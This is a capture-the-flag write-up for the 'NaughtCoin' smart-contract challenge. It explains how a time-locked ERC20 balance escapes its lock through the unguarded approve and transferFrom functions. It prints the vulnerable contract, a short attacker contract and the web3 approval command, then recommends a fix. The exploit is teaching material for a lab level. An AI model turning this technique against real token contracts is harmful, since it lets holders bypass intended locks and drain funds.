**Description**

This challenge is about a user who got a really huge supply of a specific token. The thing is, that token is locked and cannot be exchanged. The player should wait 10 years before being able to exchange those tokens, but the player cannot wait to exchange those tokens, so the player has to transfer all those tokens to another account so he'll be able to exchange them. Let's take a look at the contract:
- **NaughtCoin.sol**
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  }
}
```
**Attack Scenario**
As we can see, the transfer function is locked by the lockTokens modifier, so it's going to be a challenge to retrieve these tokens, Let's look closer, The `approve` and `transferFrom` are not locked by this modifier, meaning we can just approve to another account the maximum amount possible and then call the `transferFrom` function, Let's hop on remix and write our attacker's contract.

The code looks like this:
- **Attack.sol**
```solidity=
pragma solidity 0.8.0;


interface InaughtCoin{
    function transferFrom(address from, address to, uint256 value) external returns (bool success);
}

contract Attack {
    address public player;
    address public instance;
    constructor (address _player, address _instance)
    {
        player = _player;
        instance = _instance;
    }

    function attackhh() external{
        InaughtCoin(instance).transferFrom(player, address(this), 1000000 * (10**uint256(18)));
    }
}
```

After deploying this contract on the testnet, we can get the contract's address and approve to it as much as possible. On the console, we are going to write this command.

```javascript
contract.approve(contract_address, web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(1)))
```

Those complex web3 calls are just a way to send the uint256.max since JS can't accept such a huge number. I found it [here](https://ethereum.stackexchange.com/questions/67378/passing-1-to-a-solidity-function-which-takes-a-uint256-argument-as-input).

After this, all that's left is to call the `attackhh` function and enjoy our exchangeable token.

**Recommendation**

When we need to lock funds for a period of time, we should make sure there is no way those tokens can exit a certain wallet, meaning we should disable all the functions that allow for exchanging tokens, such as the `transferFrom` function.